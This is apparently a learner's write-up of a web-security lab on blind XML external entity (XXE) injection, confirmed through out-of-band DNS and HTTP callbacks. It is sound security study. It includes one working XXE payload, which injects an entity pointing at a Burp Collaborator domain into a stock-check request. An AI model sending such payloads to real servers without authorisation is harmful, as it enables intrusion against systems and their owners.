Blind XXE with Out-of-Band Interaction

**Category**: XXE  
**Difficulty**: Practitioner  

---

## Overview / What I Learned

This lab demonstrates a **blind XXE vulnerability** where the response does not reveal any information, but an **out-of-band interaction** can be used to detect XML external entity processing.
I learned how to use **Burp Collaborator** to confirm the vulnerability via **DNS/HTTP interactions**.

## Exploit Steps / Attack Methodology

### 1. Identifying the Target

- Navigated to a product page and used the "Check stock" feature.
- Intercepted the HTTP POST request in Burp Suite.
- Found that the request body used XML to submit product and store IDs.

### 2. Modifying the Request

- Injected an external entity referencing my Burp Collaborator domain.
- Replaced the `productId` value with the entity reference.

Modified Request:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://collabId.burpcollaborator.com">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
Sent the modified request to the server.

3. Observing the OAST Response
Switched to the Burp Collaborator tab and clicked "Poll now".
Received DNS and HTTP interactions from the lab server.
This confirmed that the server parsed and fetched the external entity, proving the XXE vulnerability.


Key Takeaways
Blind XXE vulnerabilities do not return data in the HTTP response.
Out-of-band detection using Burp Collaborator is crucial for finding blind vulnerabilities.
Always test for external entity resolution even if the response seems normal or unchanged.
